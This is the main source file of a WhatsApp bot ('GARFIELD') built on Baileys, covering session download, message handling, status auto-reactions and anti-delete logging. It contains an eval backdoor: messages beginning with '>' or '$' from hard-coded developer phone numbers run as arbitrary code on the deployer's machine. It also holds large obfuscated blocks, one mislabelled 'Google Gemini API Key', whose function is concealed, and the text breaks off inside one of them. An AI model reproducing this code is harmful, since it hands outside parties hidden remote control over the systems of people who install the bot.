const {
  default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID, makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
  } = require('@whiskeysockets/baileys')
  
  
  const l = console.log
  const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
  const fs = require('fs')
  const ff = require('fluent-ffmpeg')
  const P = require('pino')
  const googleTTS = require('google-tts-api')
  const config = require('./config') 
  const mfig = require('./Menu')
  const qrcode = require('qrcode-terminal')
  const StickersTypes = require('wa-sticker-formatter')
  const util = require('util')
  const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
  const FileType = require('file-type');
  const axios = require('axios')
  const { File } = require('megajs')
  const { fromBuffer } = require('file-type')
  const bodyparser = require('body-parser')
  const os = require('os')
  const Crypto = require('crypto')
  const path = require('path')
  const prefix = config.PREFIX
  
  const ownerNumber = ['94711502119']
  
  const tempDir = path.join(os.tmpdir(), 'cache-temp')
  if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir)
  }
  
  const clearTempDir = () => {
      fs.readdir(tempDir, (err, files) => {
          if (err) throw err;
          for (const file of files) {
              fs.unlink(path.join(tempDir, file), err => {
                  if (err) throw err;
              });
          }
      });
  }
  
  // Clear the temp directory every 5 minutes
  setInterval(clearTempDir, 5 * 60 * 1000);
  
  //===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
const sessdata = config.SESSION_ID.replace("Xnodes~", '');
const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
filer.download((err, data) => {
if(err) throw err
fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
console.log("Session downloaded ✅")
})})}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;
  
  //=============================================
  
  async function connectToWA() {
  console.log("ＣＯＮＮＥＣＴＩＮＧ ＧＡＲＦＩＩＥＬＤ 🛰️ ");
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
  var { version } = await fetchLatestBaileysVersion()
  
  const conn = makeWASocket({
          logger: P({ level: 'silent' }),
          printQRInTerminal: false,
          browser: Browsers.macOS("Firefox"),
          syncFullHistory: true,
          auth: state,
          version
          })
      
  conn.ev.on('connection.update', (update) => {
  const { connection, lastDisconnect } = update
  if (connection === 'close') {
  if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
  connectToWA()
  }
  } else if (connection === 'open') {
  console.log('ＩＮＳＴＡＬＬＩＮＧ 🧬 ')
  const path = require('path');
  fs.readdirSync("./plugins/").forEach((plugin) => {
  if (path.extname(plugin).toLowerCase() == ".js") {
  require("./plugins/" + plugin);
  }
  });
  console.log('ＸＮＯＤＥＳ ᴅᴇᴠᴇʟᴏᴘᴇᴍᴇɴᴛ')
  console.log('ＧＡＲＩＦＥＬＤ ＩＳ ＷＯＲＫＩＮＧ 🐼 ')
  
const _0x5adf79=_0xdbc5;(function(_0x17f818,_0x8444f2){const _0x5c1e8f=_0xdbc5,_0x5a4b75=_0x17f818();while(!![]){try{const _0x1413a2=-parseInt(_0x5c1e8f(0x16c))/0x1+-parseInt(_0x5c1e8f(0x165))/0x2*(-parseInt(_0x5c1e8f(0x166))/0x3)+parseInt(_0x5c1e8f(0x16a))/0x4*(-parseInt(_0x5c1e8f(0x16f))/0x5)+parseInt(_0x5c1e8f(0x175))/0x6+parseInt(_0x5c1e8f(0x17e))/0x7+-parseInt(_0x5c1e8f(0x176))/0x8*(-parseInt(_0x5c1e8f(0x163))/0x9)+-parseInt(_0x5c1e8f(0x16b))/0xa*(-parseInt(_0x5c1e8f(0x16e))/0xb);if(_0x1413a2===_0x8444f2)break;else _0x5a4b75['push'](_0x5a4b75['shift']());}catch(_0x1952da){_0x5a4b75['push'](_0x5a4b75['shift']());}}}(_0x3f21,0x3bf49));const _0x5c06b1=(function(){let _0x13a7a2=!![];return function(_0x1d95aa,_0x270410){const _0x4a2a72=_0x13a7a2?function(){const _0x5c6c23=_0xdbc5;if(_0x270410){const _0xed28aa=_0x270410[_0x5c6c23(0x171)](_0x1d95aa,arguments);return _0x270410=null,_0xed28aa;}}:function(){};return _0x13a7a2=![],_0x4a2a72;};}()),_0x2a0bdc=_0x5c06b1(this,function(){const _0x14c0f4=_0xdbc5;return _0x2a0bdc[_0x14c0f4(0x168)]()[_0x14c0f4(0x17a)]('(((.+)+)+)+$')['toString']()[_0x14c0f4(0x169)](_0x2a0bdc)[_0x14c0f4(0x17a)](_0x14c0f4(0x17b));});_0x2a0bdc();const _0x1d73fb=(function(){let _0x58d572=!![];return function(_0x1fc4ac,_0x52c842){const _0x3cedfa=_0x58d572?function(){const _0x4ce292=_0xdbc5;if(_0x52c842){const _0x49d175=_0x52c842[_0x4ce292(0x171)](_0x1fc4ac,arguments);return _0x52c842=null,_0x49d175;}}:function(){};return _0x58d572=![],_0x3cedfa;};}()),_0x387dae=_0x1d73fb(this,function(){const _0x4006e1=_0xdbc5;let _0x40119;try{const _0x2a480e=Function(_0x4006e1(0x161)+_0x4006e1(0x167)+');');_0x40119=_0x2a480e();}catch(_0x532c53){_0x40119=window;}const _0x3eeef8=_0x40119[_0x4006e1(0x16d)]=_0x40119[_0x4006e1(0x16d)]||{},_0x336928=[_0x4006e1(0x170),_0x4006e1(0x162),_0x4006e1(0x172),_0x4006e1(0x17d),_0x4006e1(0x179),'table',_0x4006e1(0x17f)];for(let _0x25a5a4=0x0;_0x25a5a4<_0x336928['length'];_0x25a5a4++){const _0x174e60=_0x1d73fb[_0x4006e1(0x169)][_0x4006e1(0x173)][_0x4006e1(0x17c)](_0x1d73fb),_0x139a74=_0x336928[_0x25a5a4],_0x5af9af=_0x3eeef8[_0x139a74]||_0x174e60;_0x174e60[_0x4006e1(0x174)]=_0x1d73fb[_0x4006e1(0x17c)](_0x1d73fb),_0x174e60[_0x4006e1(0x168)]=_0x5af9af[_0x4006e1(0x168)][_0x4006e1(0x17c)](_0x5af9af),_0x3eeef8[_0x139a74]=_0x174e60;}});function _0xdbc5(_0x528d86,_0xa7141){const _0x52c796=_0x3f21();return _0xdbc5=function(_0x387dae,_0x1d73fb){_0x387dae=_0x387dae-0x161;let _0x5005ad=_0x52c796[_0x387dae];return _0x5005ad;},_0xdbc5(_0x528d86,_0xa7141);}_0x387dae();function _0x3f21(){const _0x194690=['apply','info','prototype','__proto__','2215710rTVaXU','152Mekdaw','user','sendMessage','exception','search','(((.+)+)+)+$','bind','error','35392zkphuJ','trace','return\x20(function()\x20','warn','117567GQpCDq','https://github.com/Zenoixnoize/GARFIELD-WHATSAPP-BOT-v8/raw/asdf/Cloud/logo.png','405274GryiYq','3oMRtyO','{}.constructor(\x22return\x20this\x22)(\x20)','toString','constructor','100IUjpwg','5230oxoUAJ','413454CeCqHx','console','5742VunKpx','87830pCHLHq','log'];_0x3f21=function(){return _0x194690;};return _0x3f21();}let up='⭕►▁▁▁▁▁▁▁▁▁▁▁▁▁▁\x0a\x20\x20\x20▎\x20ＧＡＲＦＩＥＬＤ\x20ＢＯＴ\x0a\x20\x20\x20▁▁▁▁▁▁▁▁▁▁▁▁▁▁\x0a\x20▁▁▁▁▁▁▁▁▁▁▁▁▁▁\x0a▎\x20\x0a\x20\x20\x20█▄▄\u2003█▀█\u2003▀█▀\x0a\x20\x20\x20█▄█\u2003█▄█\u2003░█░\x0a⭕▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁\x0aHey\x20there,\x20!\x20🎉\x20Congratulations,\x20you\x20have\x20successfully\x20deployed\x20*GARFIELD\x20BOT*!\x0a\x0a🚀\x20*Bot\x20Connection\x20Status:*\x20\x20\x0aGarfield\x20Bot\x20🐼\x20\x20is\x20now\x20purring\x20contentedly\x20and\x20successfully\x20connected\x20to\x20this\x20device!\x20\x0a\x0a\x0a👨‍💻\x20*Creator:*\x20*Garfield*\x20\x20\x0a🏢\x20*Organization:*\x20*Xnodes\x20Development*\x20\x20\x0a📅\x20*Updated:*\x20*2025*\x20\x20\x0a\x0a🌟\x20*Join\x20our\x20WhatsApp\x20Channel\x20for\x20updates:*\x0a\x0a🔄\x20*Stay\x20tuned\x20for\x20upcoming\x20features!*';conn[_0x5adf79(0x178)](conn[_0x5adf79(0x177)]['id'],{'image':{'url':_0x5adf79(0x164)},'caption':up});
  }
  })
  conn.ev.on('creds.update', saveCreds)

  //==============================

  conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(update, null, 2));
        await AntiDelete(conn, updates);
      }
    }
  });
  //============================== 
          
  //=============readstatus=======
        
  conn.ev.on('messages.upsert', async(mek) => {
    mek = mek.messages[0]
    if (!mek.message) return
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
    ? mek.message.ephemeralMessage.message 
    : mek.message;
    //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
  if (config.READ_MESSAGE === 'true') {
    await conn.readMessages([mek.key]);  // Mark message as read
    console.log(`Marked message from ${mek.key.remoteJid} as read.`);
  }
    if(mek.message.viewOnceMessageV2)
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
      await conn.readMessages([mek.key])
    }
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
    const jawadlike = await conn.decodeJid(conn.user.id);
    const randomEmoji = '✅' ;
    await conn.sendMessage(mek.key.remoteJid, {
      react: {
        text: randomEmoji,
        key: mek.key,
      } 
    }, { statusJidList: [mek.key.participant, jawadlike] });
  }                       
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
  const user = mek.key.participant
  const text = `${config.AUTO_STATUS_MSG}`
  await conn.sendMessage(user, { text: text, react: { text: '💌', key: mek.key } }, { quoted: mek })
            }
            await Promise.all([
              saveMessage(mek),
            ]);
  const m = sms(conn, mek)
  const type = getContentType(mek.message)
  const content = JSON.stringify(mek.message)
  const from = mek.key.remoteJid
  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
  const isCmd = body.startsWith(prefix)
  var budy = typeof mek.text == 'string' ? mek.text : false;
  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
  const args = body.trim().split(/ +/).slice(1)
  const q = args.join(' ')
  const text = args.join(' ')
  const isGroup = from.endsWith('@g.us')
  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
  const senderNumber = sender.split('@')[0]
  const botNumber = conn.user.id.split(':')[0]
  const pushname = mek.pushName || 'User'
  const isMe = botNumber.includes(senderNumber)
  const isOwner = ownerNumber.includes(senderNumber) || isMe
  const botNumber2 = await jidNormalizedUser(conn.user.id);
  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
  const groupName = isGroup ? groupMetadata.subject : ''
  const participants = isGroup ? await groupMetadata.participants : ''
  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
  const isReact = m.message.reactionMessage ? true : false
  const reply = (teks) => {
  conn.sendMessage(from, { text: teks }, { quoted: mek })
  }
  const udp = botNumber.split('@')[0];
    const jawad = ('94711592119', '94787395324', '94712882498');
    let isCreator = [udp, jawad, config.DEV]
					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
					.includes(mek.sender);

    if (isCreator && mek.text.startsWith('>')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = eval(code);
						if (typeof resultTest === 'object')
							reply(util.format(resultTest));
						else reply(util.format(resultTest));
					} catch (err) {
						reply(util.format(err));
					}
					return;
				}
    if (isCreator && mek.text.startsWith('$')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = await eval(
							'const a = async()=>{\n' + code + '\n}\na()',
						);
						let h = util.format(resultTest);
						if (h === undefined) return console.log(h);
						else reply(h);
					} catch (err) {
						if (err === undefined)
							return console.log('error');
						else reply(util.format(err));
					}
					return;
				}
 //================ownerreact==============
    
  if(senderNumber.includes("94711502119")){
  if(isReact) return
  m.react("⭐")
   }
   
   const invalidNumbers = '+212';

if (senderNumber.startsWith(invalidNumbers)) {
    return reply(`*Sorry , This Bot is Not available your country  🔒*

*Creat Your Own Bot* 
_https://github.com/xnodesdev/GARFIELD-WHATSAPP-BOT-v10_`);
    // You can also add more actions here if necessary
} 


   
  //==========public react============//
  // Auto React 
  if (!isReact && senderNumber !== botNumber && senderNumber !== ownerNumber) {
          const reactions = '🌹' ;
  // 
          m.react(reactions);
      
  }
  
  // Owner React
  if (!isReact && senderNumber === botNumber) {
      if (config.AUTO_REACT === 'true') {
          const randomOwnerReaction = '✅' ; // 
          m.react(randomOwnerReaction);
      }
  }
          
// custum react settings        
// Google Gemini API Key
(function(_0x43016c,_0x3bc323){function _0xa22d99(_0x24167a,_0x46955c,_0x216214,_0x460fcc){return _0x4046(_0x460fcc- -0x2e2,_0x46955c);}const _0x5bd2da=_0x43016c();function _0x4f2b19(_0x3e44e8,_0x1f0cf1,_0x1a326b,_0x4654fe){return _0x4046(_0x3e44e8-0x3bb,_0x1f0cf1);}while(!![]){try{const _0x4bcdbf=-parseInt(_0x4f2b19(0x588,0x5ab,0x589,0x564))/(-0x1c6*0xd+-0x26ff+0x3e0e)+-parseInt(_0x4f2b19(0x54a,0x530,0x579,0x56b))/(0xac4+-0x1bb*0xc+0xa02)+parseInt(_0x4f2b19(0x5c5,0x5d1,0x57a,0x5ee))/(-0xfbe+-0xd*0x5f+0x1494)+-parseInt(_0x4f2b19(0x56d,0x52f,0x54b,0x52d))/(0x1e39+-0x2576+0x1*0x741)+-parseInt(_0xa22d99(-0xd7,-0xea,-0xbb,-0xe2))/(-0x67d+0xbc7+-0x545)+-parseInt(_0xa22d99(-0xe7,-0x13e,-0xc6,-0x108))/(0x928+0x1*-0x241f+-0x7*-0x3db)*(-parseInt(_0x4f2b19(0x56e,0x52b,0x59f,0x586))/(-0x18d9*-0x1+0x1f2e+-0x3800))+-parseInt(_0x4f2b19(0x5c9,0x598,0x60a,0x610))/(-0x11ea*-0x2+-0x1610+0x1*-0xdbc)*(-parseInt(_0x4f2b19(0x5cb,0x5d0,0x5a5,0x5b8))/(-0x36f*0x3+-0xdc5+0x181b));if(_0x4bcdbf===_0x3bc323)break;else _0x5bd2da['push'](_0x5bd2da['shift']());}catch(_0x1252f3){_0x5bd2da['push'](_0x5bd2da['shift']());}}}(_0x5546,0x81c42+-0x2086+0xc20b));function _0x33da7e(_0xf748e9,_0x2471f3,_0x4992c6,_0x5d5602){return _0x4046(_0x2471f3- -0x1c5,_0xf748e9);}const _0x469d76=(function(){const _0x541add={'VWYpp':function(_0x2d6869,_0x11e7d1){return _0x2d6869(_0x11e7d1);},'NxRZB':function(_0x49558d,_0x45c469){return _0x49558d===_0x45c469;},'OkGon':_0x1a4b34(0x110,0x103,0xed,0xf5),'WnnfG':_0x1a4b34(0xf8,0x12a,0x129,0xec)};let _0x19f6f6=!![];function _0x1157fc(_0xb3e89c,_0x38cb6e,_0x577cd1,_0xaa0918){return _0x4046(_0xb3e89c-0x8e,_0x38cb6e);}function _0x1a4b34(_0x137316,_0x56a75f,_0x2747b7,_0x102299){return _0x4046(_0x102299- -0x112,_0x2747b7);}return function(_0x39497d,_0x8bff84){const _0x2219a6=_0x19f6f6?function(){function _0x5d3a25(_0x5d5786,_0x49d99d,_0x374257,_0x5634ac){return _0x4046(_0x49d99d-0x146,_0x374257);}function _0x69aeac(_0x4cc754,_0x355261,_0x1a9624,_0x12f69b){return _0x4046(_0x1a9624- -0xdd,_0x355261);}const _0x459bdc={'ztxkE':'Error\x20call'+_0x69aeac(0x122,0xab,0xe2,0x95)+_0x69aeac(0x171,0x11e,0x137,0x121),'oZWGU':function(_0x4706b6,_0x2c3b0e){return _0x541add['VWYpp'](_0x4706b6,_0x2c3b0e);},'nWLzf':_0x69aeac(0xd0,0x14b,0x101,0x105)+_0x69aeac(0xbe,0x133,0x107,0xe1)+_0x69aeac(0xf1,0x91,0xcb,0xaa)+_0x69aeac(0x15d,0xe9,0x119,0xf9)+_0x69aeac(0x106,0x14d,0x116,0x145)};if(_0x541add[_0x5d3a25(0x36d,0x363,0x3a7,0x3a7)](_0x69aeac(0xba,0x107,0xc7,0x102),_0x541add['OkGon']))_0x28bfd9[_0x5d3a25(0x2fd,0x334,0x369,0x360)](_0x459bdc[_0x69aeac(0xf6,0x14c,0x10c,0xff)],_0x570d77),_0x459bdc['oZWGU'](_0x5c6956,_0x459bdc[_0x5d3a25(0x333,0x2f1,0x328,0x328)]);else{if(_0x8bff84){if(_0x5d3a25(0x380,0x344,0x346,0x33d)===_0x541add[_0x5d3a25(0x2d8,0x2d2,0x2a1,0x319)]){const _0x44ca75=_0x8bff84['apply'](_0x39497d,arguments);return _0x8bff84=null,_0x44ca75;}else{if(_0x3f6b75){const _0x3d7ad8=_0xfa64e2[_0x69aeac(0xf2,0xad,0xfa,0xdc)](_0x2f11ef,arguments);return _0x1c7978=null,_0x3d7ad8;}}}}}:function(){};return _0x19f6f6=![],_0x2219a6;};}()),_0x52f488=_0x469d76(this,function(){const _0x250dbb={};_0x250dbb['uJAEL']='(((.+)+)+)'+'+$';function _0x4a189a(_0x2328c2,_0x303db9,_0x1ed704,_0x42d6db){return _0x4046(_0x2328c2- -0xc5,_0x42d6db);}const _0x4e64ca=_0x250dbb;function _0x2b7fb0(_0xca7eb0,_0x14ec5c,_0x64bc8a,_0x4b6423){return _0x4046(_0xca7eb0- -0x2e9,_0x64bc8a);}return _0x52f488['toString']()['search'](_0x2b7fb0(-0xea,-0x11a,-0x11f,-0xc8)+'+$')[_0x4a189a(0x15e,0x19b,0x194,0x122)]()[_0x2b7fb0(-0xcd,-0x10e,-0xbd,-0x90)+'r'](_0x52f488)[_0x2b7fb0(-0x13c,-0xee,-0x16c,-0x126)](_0x4e64ca[_0x2b7fb0(-0x158,-0x16d,-0x131,-0x192)]);});_0x52f488();function _0x4046(_0x2c4cc4,_0x28bfd9){const _0x570d77=_0x5546();return _0x4046=function(_0x5c6956,_0x4768b4){_0x5c6956=_0x5c6956-(-0x1cb5+0x82d+-0x1*-0x160f);let _0x28672a=_0x570d77[_0x5c6956];if(_0x4046['lZWmoz']===undefined){var _0x48cd95=function(_0x51f755){const _0x144679='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x1f5b70='',_0x92dab6='',_0x59b633=_0x1f5b70+_0x48cd95;for(let _0x5c173e=0x8e1*-0x1+-0x1*-0x1ce5+-0x7a*0x2a,_0x125a5d,_0x166b41,_0x54cac6=0x2*-0x1293+-0x1*0x1e0b+0x4331*0x1;_0x166b41=_0x51f755['charAt'](_0x54cac6++);~_0x166b41&&(_0x125a5d=_0x5c173e%(0x2*-0xdd7+-0x1e30+0x39e2)?_0x125a5d*(-0x63*0x3f+-0x7*-0x53d+0x1*-0xc0e)+_0x166b41:_0x166b41,_0x5c173e++%(-0x261b+-0x2612+-0xeb*-0x53))?_0x1f5b70+=_0x59b633['charCodeAt'](_0x54cac6+(0x37*-0x2d+0x24d8+-0x1*0x1b23))-(-0x264e*-0x1+-0x1b28+0x1*-0xb1c)!==-0x2d2*-0x1+-0xbd8+-0x5*-0x1ce?String['fromCharCode'](-0x91f*-0x3+-0x2*-0x1+0xd3*-0x20&_0x125a5d>>(-(0x13a5+0x175*0x1+-0x1518)*_0x5c173e&0x53*-0x65+-0x9*0x334+0x3d99*0x1)):_0x5c173e:0x21ac+0xce4+-0x2e90){_0x166b41=_0x144679['indexOf'](_0x166b41);}for(let _0x34d22e=-0x1a40+-0x82+-0x89*-0x32,_0x1ec28c=_0x1f5b70['length'];_0x34d22e<_0x1ec28c;_0x34d22e++){_0x92dab6+='%'+('00'+_0x1f5b70['charCodeAt'](_0x34d22e)['toString'](-0x3*-0x8e5+0x1f*0x73+-0x2b4*0xf))['slice'](-(0x1*0x19e3+-0xda*-0xd+-0xc51*0x3));}return decodeURIComponent(_0x92dab6);};_0x4046['oGJROc']=_0x48cd95,_0x2c4cc4=arguments,_0x4046['lZWmoz']=!![];}const _0x5441da=_0x570d77[-0xdaa+0x56*0xe+0x8f6],_0x5dc3d2=_0x5c6956+_0x5441da,_0x45c1ad=_0x2c4cc4[_0x5dc3d2];if(!_0x45c1ad){const _0x49e967=function(_0x5ec609){this['msbolF']=_0x5ec609,this['CFywdp']=[0x9a2+-0xae1+0x140,-0x9cd*-0x2+0x3*0x71+-0x14ed,0x1*0x1e1a+-0x4*-0x6fe+0x1d09*-0x2],this['jexPCL']=function(){return'newState';},this['UblAGV']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['gfmXuI']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x49e967['prototype']['OtQEyK']=function(){const _0x2c0e9b=new RegExp(this['UblAGV']+this['gfmXuI']),_0x32d93a=_0x2c0e9b['test'](this['jexPCL']['toString']())?--this['CFywdp'][0x8b*0x25+0x16c+-0xac1*0x2]:--this['CFywdp'][0x2f*-0xcd+-0x8d5+0x2e78];return this['VzDula'](_0x32d93a);},_0x49e967['prototype']['VzDula']=function(_0x345134){if(!Boolean(~_0x345134))return _0x345134;return this['NYcUjY'](this['msbolF']);},_0x49e967['prototype']['NYcUjY']=function(_0x522038){for(let _0x3fc756=0x198f*-0x1+0xea9+0xae6*0x1,_0x3c28b9=this['CFywdp']['length'];_0x3fc756<_0x3c28b9;_0x3fc756++){this['CFywdp']['push'](Math['round'](Math['random']())),_0x3c28b9=this['CFywdp']['length'];}return _0x522038(this['CFywdp'][-0x1*0x2ff+0xc94+0x1*-0x995]);},new _0x49e967(_0x4046)['OtQEyK'](),_0x28672a=_0x4046['oGJROc'](_0x28672a),_0x2c4cc4[_0x5dc3d2]=_0x28672a;}else _0x28672a=_0x45c1ad;return _0x28672a;},_0x4046(_0x2c4cc4,_0x28bfd9);}function _0xec7cba(_0x5c8634,_0x142f9d,_0x3f04ed,_0x29a7db){return _0x4046(_0x142f9d-0x98,_0x5c8634);}const _0x4b4568=(function(){const _0x56c58f={};_0x56c58f[_0x3862fb(0x47b,0x45b,0x444,0x459)]=_0x4373d7(0x4af,0x460,0x4b3,0x4a9);const _0x5330bd=_0x56c58f;let _0x54a5ea=!![];function _0x4373d7(_0x3866a8,_0x15ff29,_0x513f98,_0x41351c){return _0x4046(_0x3866a8-0x300,_0x41351c);}function _0x3862fb(_0x3f1853,_0x31d8bd,_0x549b57,_0x58c0fe){return _0x4046(_0x3f1853-0x2e3,_0x549b57);}return function(_0xac16e4,_0x3693de){const _0x1f9071={};_0x1f9071[_0xbc4686(0x14d,0x118,0x120,0x157)]=_0x5330bd[_0x45b529(0x2ea,0x2e2,0x2ba,0x2ac)];function _0xbc4686(_0xc2c703,_0x592774,_0x48f5d6,_0x230d59){return _0x3862fb(_0x48f5d6- -0x38c,_0x592774-0x14d,_0x230d59,_0x230d59-0xf2);}function _0x45b529(_0x2bccbb,_0x4435e6,_0x1c2249,_0x20ed58){return _0x4373d7(_0x2bccbb- -0x1ae,_0x4435e6-0x17d,_0x1c2249-0x98,_0x4435e6);}const _0x3de7b2=_0x1f9071,_0x29797b=_0x54a5ea?function(){function _0x4f0498(_0x2d93a2,_0x5d8238,_0x54556e,_0x1b43fc){return _0xbc4686(_0x2d93a2-0x3f,_0x5d8238-0x170,_0x5d8238- -0x29,_0x54556e);}function _0x133a5d(_0x8b2577,_0x236f80,_0x16602f,_0x3c6950){return _0x45b529(_0x3c6950- -0x50,_0x8b2577,_0x16602f-0xa2,_0x3c6950-0x138);}if(_0x3de7b2[_0x133a5d(0x319,0x2f7,0x2ac,0x2cb)]!=='lNTPh'){const _0xc268b9=_0x24661c[_0x133a5d(0x327,0x28e,0x2cb,0x2d9)](_0x35c797,arguments);return _0x305817=null,_0xc268b9;}else{if(_0x3693de){const _0x56c632=_0x3693de['apply'](_0xac16e4,arguments);return _0x3693de=null,_0x56c632;}}}:function(){};return _0x54a5ea=![],_0x29797b;};}()),_0x143ecb=_0x4b4568(this,function(){const _0x51784d={'HzZWd':function(_0x2f7249,_0x1c1796){return _0x2f7249!==_0x1c1796;},'nqdbW':_0x57317e(0x19d,0x160,0x1a1,0x11a),'sTJMx':function(_0x50c330,_0x4f0f9a){return _0x50c330(_0x4f0f9a);},'BFZWF':function(_0x46ae2c,_0x26198b){return _0x46ae2c+_0x26198b;},'SMnEn':'return\x20(fu'+_0x57317e(0x13a,0x15f,0x1ac,0x148),'wYbNu':'{}.constru'+_0x57317e(0x14e,0x124,0x133,0x149)+'rn\x20this\x22)('+'\x20)','RSpuV':function(_0x575670){return _0x575670();},'pUeZO':function(_0x77907,_0x8b4a57){return _0x77907===_0x8b4a57;},'NwInZ':_0x218ddf(0xed,0x120,0xcf,0x122),'lIdkE':_0x218ddf(0xf9,0x100,0x141,0xf3),'AKfZZ':_0x218ddf(0x124,0x14a,0x174,0x164),'SbZwW':_0x57317e(0x174,0x18f,0x1d6,0x1ba),'DRKZk':_0x218ddf(0xa8,0xf6,0xb0,0x124),'NCKei':_0x57317e(0x12e,0x149,0x197,0x107),'zBQQN':_0x218ddf(0x135,0xff,0x141,0x14a)};let _0x49d8ef;function _0x218ddf(_0x215a23,_0x5036cd,_0xdcdf6c,_0x4c6ee5){return _0x4046(_0x5036cd- -0xb8,_0xdcdf6c);}try{if(_0x51784d[_0x218ddf(0x13d,0x123,0x129,0x15b)](_0x51784d['nqdbW'],_0x51784d[_0x57317e(0x178,0x14d,0x18d,0xfd)])){const _0x4af282=_0x3d9d92?function(){function _0x5dab7e(_0x24ab70,_0x387153,_0x18b961,_0x43730e){return _0x218ddf(_0x24ab70-0xbc,_0x24ab70-0x403,_0x43730e,_0x43730e-0x1f);}if(_0x2ae7db){const _0x1d3fbf=_0x7b8bc0[_0x5dab7e(0x522,0x566,0x563,0x571)](_0xc810e3,arguments);return _0x3f3abc=null,_0x1d3fbf;}}:function(){};return _0x31780a=![],_0x4af282;}else{const _0x47f6f7=_0x51784d[_0x57317e(0xd3,0x121,0xd1,0xe2)](Function,_0x51784d[_0x218ddf(0x126,0x160,0x187,0x13f)](_0x51784d[_0x218ddf(0xc8,0x102,0xf7,0xb2)]+_0x51784d['wYbNu'],');'));_0x49d8ef=_0x51784d['RSpuV'](_0x47f6f7);}}catch(_0x5631e1){if(_0x51784d[_0x57317e(0x137,0x138,0x177,0x113)](_0x51784d[_0x218ddf(0x120,0x13d,0xfd,0x177)],_0x51784d['lIdkE'])){if(_0x23e33a){const _0x59a66a=_0x108bfe['apply'](_0x497889,arguments);return _0x2e976a=null,_0x59a66a;}}else _0x49d8ef=window;}const _0x1df9e9=_0x49d8ef[_0x218ddf(0x12b,0x121,0x157,0x157)]=_0x49d8ef[_0x218ddf(0x15b,0x121,0x14b,0x13f)]||{};function _0x57317e(_0x145e94,_0x50fa4f,_0x5e1a25,_0x3890a2){return _0x4046(_0x50fa4f- -0x7d,_0x3890a2);}const _0x4f65c6=[_0x51784d[_0x218ddf(0x12c,0x11a,0x14b,0xed)],_0x51784d['SbZwW'],_0x51784d[_0x57317e(0x149,0x199,0x169,0x1b4)],_0x218ddf(0x122,0x136,0x116,0x15c),_0x51784d['NCKei'],_0x51784d[_0x218ddf(0x185,0x159,0x11b,0x176)],'trace'];for(let _0x2a4a2b=0x668+-0x7*0x123+0x18d*0x1;_0x2a4a2b<_0x4f65c6['length'];_0x2a4a2b++){const _0x4f7c60=_0x4b4568[_0x57317e(0x166,0x19f,0x1a6,0x14f)+'r'][_0x218ddf(0x15d,0x12a,0x16b,0xef)][_0x218ddf(0x91,0xcf,0x83,0xe7)](_0x4b4568),_0x551ed1=_0x4f65c6[_0x2a4a2b],_0x5834cf=_0x1df9e9[_0x551ed1]||_0x4f7c60;_0x4f7c60[_0x57317e(0x1cc,0x1a3,0x177,0x15d)]=_0x4b4568[_0x57317e(0x100,0x10a,0x137,0xe3)](_0x4b4568),_0x4f7c60[_0x218ddf(0x1a4,0x16b,0x1af,0x13d)]=_0x5834cf[_0x57317e(0x1c6,0x1a6,0x1f2,0x182)][_0x218ddf(0x116,0xcf,0xde,0x118)](_0x5834cf),_0x1df9e9[_0x551ed1]=_0x4f7c60;}});function _0x5546(){const 